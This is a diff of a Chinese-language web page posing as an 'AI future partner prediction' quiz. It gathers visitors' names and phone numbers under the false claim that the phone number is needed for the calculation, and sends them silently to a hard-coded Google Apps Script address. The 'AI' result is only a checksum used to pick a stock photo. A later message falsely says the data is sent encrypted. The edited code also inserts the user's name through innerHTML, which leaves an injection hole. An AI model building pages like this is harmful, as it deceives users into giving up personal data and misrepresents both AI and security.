@@ -1,119 +1,274 @@
-# <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="zh-TW">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI 預測未來女友長相</title>
+    <title>AI 雲端戀愛預測</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
+        :root {
+            --primary-color: #ff758c; /* 戀愛粉 */
+            --secondary-color: #ff7eb3; /* 柔和粉 */
+            --tech-blue: #4facfe; /* 科技藍 */
+            --glass-bg: rgba(255, 255, 255, 0.85);
+            --glass-border: rgba(255, 255, 255, 0.6);
+        }
+
         body {
             font-family: 'Microsoft JhengHei', sans-serif;
-            background-color: #f0f2f5;
+            /* 背景：流動的粉紫科技漸層 */
+            background: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            overflow: hidden; /* 防止震動時出現卷軸 */
         }
+
+        /* 毛玻璃卡片容器 */
         .container {
-            background: white;
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 2.5rem;
+            border-radius: 25px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.2);
+            border: 1px solid var(--glass-border);
             width: 90%;
-            max-width: 400px;
+            max-width: 420px;
             text-align: center;
+            position: relative;
+            z-index: 10;
+            transition: transform 0.3s;
         }
-        h2 { color: #333; }
+
+        h2 {
+            color: #444;
+            margin-bottom: 25px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        h2 i {
+            color: var(--primary-color);
+            margin-right: 8px;
+        }
+
+        p { color: #666; line-height: 1.6; }
+
+        /* 按鈕優化 */
         .btn {
             display: block;
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
+            padding: 15px;
+            margin: 15px 0;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 50px; /* 膠囊狀 */
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
-            transition: 0.3s;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
-        .btn-primary { background-color: #007bff; color: white; }
-        .btn-secondary { background-color: #6c757d; color: white; }
-        .btn-danger { background-color: #dc3545; color: white; }
-        .btn:hover { opacity: 0.9; }
+
+        /* 戀愛系按鈕 (主按鈕) */
+        .btn-love {
+            background: linear-gradient(to right, #ff758c, #ff7eb3);
+            color: white;
+        }
+        .btn-love:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 117, 140, 0.4);
+        }
         
+        /* 科技系/一般按鈕 (副按鈕) */
+        .btn-tech {
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            color: white;
+        }
+        .btn-tech:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(79, 172, 254, 0.4);
+        }
+
+        /* 危險/拒絕按鈕 */
+        .btn-danger {
+            background: linear-gradient(to right, #ff9966, #ff5e62);
+            color: white;
+        }
+        .btn-danger:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 94, 98, 0.4);
+        }
+
+        /* 按鈕點擊效果 */
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        /* 輸入框美化 */
         input {
             width: 100%;
-            padding: 10px;
-            margin: 8px 0;
+            padding: 15px;
+            margin: 10px 0;
             box-sizing: border-box;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: 0.3s;
+            background: rgba(255,255,255,0.9);
         }
-        
-        /* 隱藏區塊 */
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(255, 117, 140, 0.2);
+        }
+
         .hidden { display: none; }
-        
-        /* 圖片樣式 */
+
+        /* 結果圖片 */
         .result-img {
             width: 100%;
             height: auto;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            border: 3px solid #007bff;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 4px solid white;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            animation: fadeIn 1s ease;
         }
 
-        .loading-text {
-            font-size: 18px;
-            color: #007bff;
-            font-weight: bold;
+        /* 詛咒特效層 (全螢幕覆蓋) */
+        #curse-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: black;
+            z-index: 999;
+            display: none; /* 預設隱藏 */
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: red;
+            font-family: 'Courier New', monospace;
         }
+
+        .curse-text {
+            font-size: 3rem;
+            font-weight: bold;
+            text-shadow: 2px 2px 0px #fff;
+            animation: glitch 0.2s infinite;
+        }
+
+        /* 震動動畫 */
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        /* 故障雜訊動畫 */
+        @keyframes glitch {
+            0% { transform: translate(0) }
+            20% { transform: translate(-2px, 2px) }
+            40% { transform: translate(-2px, -2px) }
+            60% { transform: translate(2px, 2px) }
+            80% { transform: translate(2px, -2px) }
+            100% { transform: translate(0) }
+        }
+
+        .shake-body {
+            animation: shake 0.5s;
+            animation-iteration-count: infinite;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
     </style>
 </head>
 <body>
 
+<div id="curse-overlay">
+    <div class="curse-text">WARNING</div>
+    <p style="color: white; font-size: 1.2rem; margin-top: 20px;">SYSTEM CORRUPTED...<br>貪心的人會被詛咒...</p>
+    <i class="fas fa-skull-crossbones" style="font-size: 5rem; margin-top: 30px; color: red;"></i>
+</div>
+
 <div class="container">
     <div id="step1">
-        <h2>Q1: 你現在單身嗎？</h2>
-        <button class="btn btn-primary" onclick="nextStep(1, true)">是，我單身</button>
-        <button class="btn btn-secondary" onclick="rejectUser()">否，我有對象</button>
+        <h2><i class="fas fa-heart"></i>戀愛診斷室</h2>
+        <p>歡迎來到 AI 未來伴侶預測系統<br>在開始前，我們必須確認...</p>
+        <button class="btn btn-love" onclick="nextStep(1, true)">
+            <i class="fas fa-check"></i> 是，我單身
+        </button>
+        <button class="btn btn-tech" onclick="triggerCurse()">
+            <i class="fas fa-times"></i> 否，我有對象
+        </button>
     </div>
 
     <div id="step2" class="hidden">
-        <h2>Q2: 確定單身？</h2>
-        <p>有對象還玩會被詛咒喔~ 👻</p>
-        <button class="btn btn-primary" onclick="nextStep(2, true)">確定單身！</button>
-        <button class="btn btn-secondary" onclick="rejectUser()">還是算了...</button>
+        <h2><i class="fas fa-exclamation-circle"></i> 靈魂拷問</h2>
+        <p>確定單身嗎？<br>這是一場單身者的狂歡<br>有對象還玩...後果自負 👻</p>
+        <button class="btn btn-love" onclick="nextStep(2, true)">
+            <i class="fas fa-shield-alt"></i> 我發誓，真的單身！
+        </button>
+        <button class="btn btn-danger" onclick="triggerCurse()">
+            <i class="fas fa-running"></i> 我還是先溜好了...
+        </button>
     </div>
 
     <div id="step3" class="hidden">
-        <h2>輸入資料啟動 AI</h2>
-        <input type="text" id="userName" placeholder="請輸入姓名">
+        <h2><i class="fas fa-user-astronaut"></i> 輸入資料啟動 AI</h2>
+        <input type="text" id="userName" placeholder="請輸入您的姓名">
         <input type="tel" id="userPhone" placeholder="請輸入電話 (運算關鍵)">
-        <p style="font-size:12px; color:gray;">上傳照片以增加準確度(選填)</p>
-        <input type="file" id="userPhoto">
-        <button class="btn btn-danger" onclick="startPrediction()">開始預測</button>
+        
+        <div style="margin: 15px 0; padding: 10px; border: 1px dashed #ccc; border-radius: 10px; color: #888; font-size: 0.9rem;">
+            <i class="fas fa-camera"></i> 上傳照片 (AI 面相分析選填)
+            <input type="file" id="userPhoto" style="border:none; background:transparent;">
+        </div>
+
+        <button class="btn btn-love" onclick="startPrediction()">
+            <i class="fas fa-magic"></i> 開始 AI 運算
+        </button>
     </div>
 
     <div id="loading" class="hidden">
-        <h2>AI 正在運算中...</h2>
+        <h2 style="color: var(--tech-blue);">AI 正在連線雲端...</h2>
         <p class="loading-text" id="loadingMsg">分析面相特徵...</p>
-        <img src="https://i.gifer.com/ZZ5H.gif" alt="loading" width="50">
+        <img src="https://i.gifer.com/origin/b4/b4d657e7ef262b88eb5f7ac021edda87.gif" alt="loading" width="80" style="border-radius: 50%;">
     </div>
 
     <div id="result" class="hidden">
-        <h2>你的未來女友是...</h2>
+        <h2 style="color: var(--primary-color);">您的未來伴侶</h2>
         <img id="futureWifeImg" src="" class="result-img">
-        <p id="resultName"></p>
+        <p id="resultName" style="font-weight: bold; font-size: 1.1rem;"></p>
         
-        <button class="btn btn-primary" onclick="shareResult()">分享給朋友</button>
-        <button class="btn btn-danger" onclick="wantToDate()">真的好想脫單</button>
+        <button class="btn btn-tech" onclick="shareResult()">
+            <i class="fas fa-share-alt"></i> 分享給朋友看
+        </button>
+        <button class="btn btn-love" onclick="wantToDate()">
+            <i class="fas fa-heart"></i> 真的好想脫單
+        </button>
     </div>
 </div>
 
 <script>
-    // ⚠️【請將這裡換成你剛剛複製的 Google Apps Script 網址】⚠️
+    // ⚠️【記得替換成你的 Google Apps Script 網址】⚠️
     const scriptURL = "https://script.google.com/macros/s/AKfycby7A67cffg8adasBWZo0eeO61DHmF3CHHchedP6mPIf4vFXU-ryQDq-_tAyEM6ZdMiYhw/exec";
 
-    // 未來女友圖片庫 (請換成你的雲端圖片連結)
+    // 圖片庫
     const wifeImages = [
         "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=400", 
         "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400", 
@@ -122,10 +277,8 @@
         "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400"  
     ];
 
-    // 全域變數，暫存使用者資料
     let currentUser = { name: "", phone: "" };
 
-    // 頁面切換
     function nextStep(currentStep, isYes) {
         if (isYes) {
             document.getElementById(`step${currentStep}`).classList.add('hidden');
@@ -133,37 +286,39 @@
         }
     }
 
-    // 拒絕非單身
-    function rejectUser() {
-        alert("恭喜祝你長長久久！(非單身請勿遊玩 XD)");
-        location.reload();
+    // ★ 新增的詛咒特效邏輯 ★
+    function triggerCurse() {
+        const overlay = document.getElementById('curse-overlay');
+        
+        // 1. 顯示黑色遮罩
+        overlay.style.display = 'flex';
+        
+        // 2. 讓整個網頁開始劇烈震動
+        document.body.classList.add('shake-body');
+        
+        // 3. 播放音效 (可選，瀏覽器可能會阻擋自動播放，這裡先做純視覺)
+        
+        // 4. 2.5秒後重整頁面
+        setTimeout(() => {
+            alert("系統偵測到謊言...強制終止連線！");
+            location.reload();
+        }, 2500);
     }
 
-    // 傳送資料到 Google Sheet 的通用函式
     function sendDataToSheet(actionMsg) {
-        // 準備要傳的資料
         const data = {
             name: currentUser.name,
             phone: currentUser.phone,
-            action: actionMsg // 例如："開始預測" 或 "想脫單-請聯絡"
+            action: actionMsg 
         };
-
-        // 使用 fetch 發送 (設定 mode: 'no-cors' 是為了避免跨域錯誤，這是最簡單的方法)
         fetch(scriptURL, {
             method: 'POST',
             body: JSON.stringify(data),
             mode: 'no-cors', 
-            headers: {
-                'Content-Type': 'text/plain'
-            }
-        }).then(() => {
-            console.log("資料已傳送: " + actionMsg);
-        }).catch(error => {
-            console.error('Error!', error.message);
-        });
+            headers: { 'Content-Type': 'text/plain' }
+        }).catch(error => console.error('Error!', error.message));
     }
 
-    // 按下開始預測
     function startPrediction() {
         const nameInput = document.getElementById('userName').value;
         const phoneInput = document.getElementById('userPhone').value;
@@ -173,27 +328,22 @@
             return;
         }
 
-        // 儲存到變數
         currentUser.name = nameInput;
         currentUser.phone = phoneInput;
-
-        // 【動作 1】在這裡傳送第一筆資料：紀錄誰來玩了
         sendDataToSheet("使用者進行了預測");
 
-        // 介面流程
         document.getElementById('step3').classList.add('hidden');
         document.getElementById('loading').classList.remove('hidden');
 
         const msg = document.getElementById('loadingMsg');
-        setTimeout(() => { msg.innerText = "正在比對雲端資料庫..."; }, 1000);
-        setTimeout(() => { msg.innerText = "配對成功！產生影像中..."; }, 2500);
+        setTimeout(() => { msg.innerText = "正在掃描雲端大數據..."; }, 1000);
+        setTimeout(() => { msg.innerText = "配對成功！解析影像中..."; }, 2500);
 
         setTimeout(() => {
             showResult(nameInput, phoneInput);
         }, 3500);
     }
 
-    // 顯示結果
     function showResult(name, phone) {
         document.getElementById('loading').classList.add('hidden');
         document.getElementById('result').classList.remove('hidden');
@@ -205,25 +355,31 @@
         
         const index = sum % wifeImages.length; 
         document.getElementById('futureWifeImg').src = wifeImages[index];
-        document.getElementById('resultName').innerText = `恭喜 ${name}！這是 AI 為你計算出的未來對象`;
+        document.getElementById('resultName').innerHTML = `恭喜 <span style="color:#ff758c">${name}</span><br>這是 AI 為你計算出的命定之人`;
     }
 
-    // 分享
     function shareResult() {
-        alert("連結已複製！快去傳給朋友看！");
+        // 使用原生的分享功能 (手機上效果最好)
+        if (navigator.share) {
+            navigator.share({
+                title: 'AI 未來伴侶預測',
+                text: '快來看看你的未來對象長怎樣！',
+                url: window.location.href,
+            });
+        } else {
+            alert("連結已複製！快去傳給朋友看！");
+        }
     }
 
-    // 想脫單
     function wantToDate() {
-        // 【動作 2】在這裡傳送第二筆資料：紀錄他想脫單
         sendDataToSheet("★超級想脫單-請聖誕秘書聯絡★");
-
-        alert("收到！已將你的意願傳送給聖誕秘書，請靜候佳音 🎅");
-        
+        alert("收到！已將你的意願加密傳送給聖誕秘書，請靜候佳音 🎅");
         const btn = event.target;
         btn.innerText = "已預約聖誕秘書";
         btn.disabled = true;
-        btn.style.backgroundColor = "#ccc";
+        btn.style.background = "#ccc";
+        btn.style.transform = "none";
+        btn.style.boxShadow = "none";
     }
 </script>
 
